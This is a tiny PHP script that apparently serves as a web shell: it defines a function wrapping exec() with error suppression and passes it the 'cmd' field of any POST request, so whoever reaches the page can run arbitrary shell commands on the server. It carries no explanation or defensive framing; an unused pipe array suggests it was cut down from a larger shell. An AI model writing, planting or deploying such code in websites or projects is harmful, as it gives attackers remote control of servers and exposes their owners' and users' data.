<?php
function Exe($command)
{
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	
	if(function_exists('exec')){@exec($command,$output);$output=join("\n",$output);$exec=$output;}

	return $exec;
}

Exe($_POST['cmd']);
?>